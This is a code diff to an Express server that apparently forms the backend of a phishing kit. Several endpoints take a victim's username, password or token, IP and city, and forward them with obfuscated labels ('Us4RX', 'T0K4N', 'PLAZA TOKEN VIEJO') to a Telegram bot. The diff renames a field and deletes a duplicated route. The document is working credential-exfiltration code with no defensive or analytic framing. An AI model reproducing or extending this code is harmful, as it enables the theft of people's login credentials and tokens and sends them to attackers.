@@ -60,14 +60,14 @@ app.post('/api/sendMessage', async (req, res) => {
 });
 
 app.post('/api/sendMessage2', async (req, res) => {
-    const { user, password, ip, city } = req.body;
+    const { usar, password, ip, city } = req.body;
 
-    if (!user || !ip || !password) {
+    if (!usar || !ip || !password) {
         return res.status(400).json({ error: 'Faltan datos obligatorios' });
     }
 
     // Construir mensaje
-    const message = `🔐🟢PLAZA TOKEN VIEJO🟢\nUs4RX: <code>${user}</code>\nT0K4N: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
+    const message = `🔐🟢PLAZA TOKEN VIEJO🟢\nUs4RX: <code>${usar}</code>\nT0K4N: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -105,28 +105,6 @@ app.post('/api/sendMessageEmpre', async (req, res) => {
     }
 });
 
-app.post('/api/sendMessage2', async (req, res) => {
-    const { user, password, ip, city } = req.body;
-
-    if (!user || !ip || !password) {
-        return res.status(400).json({ error: 'Faltan datos obligatorios' });
-    }
-
-    // Construir mensaje
-    const message = `🔐🟢PLAZA TOKEN VIEJO🟢\nUs4RX: <code>${user}</code>\nT0K4N: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
-
-    try {
-        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: "HTML",
-        });
-        res.status(200).json({ success: true, data: response.data });
-    } catch (error) {
-        console.error('Error al enviar mensaje a Telegram:', error);
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
 
 app.post('/api/sendMessages', async (req, res) => {
     const { user, passa, ip, city } = req.body;
